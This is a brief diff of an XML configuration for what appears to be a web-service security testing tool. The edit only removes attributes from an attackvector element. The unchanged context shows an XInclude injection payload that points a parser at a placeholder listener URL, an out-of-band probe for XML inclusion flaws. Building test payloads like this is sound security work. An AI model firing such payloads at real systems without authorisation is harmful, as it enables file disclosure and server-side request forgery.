@@ -9,7 +9,7 @@
     <externalResources>false</externalResources>
 </params>
 <attackvectors>
-<attackvector type="system" default="true">
+<attackvector>
 <directMessage><![CDATA[<?xml version='1.0'?>
 <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="§tf_listenURL§"></xi:include></data>]]></directMessage>
 </attackvector>
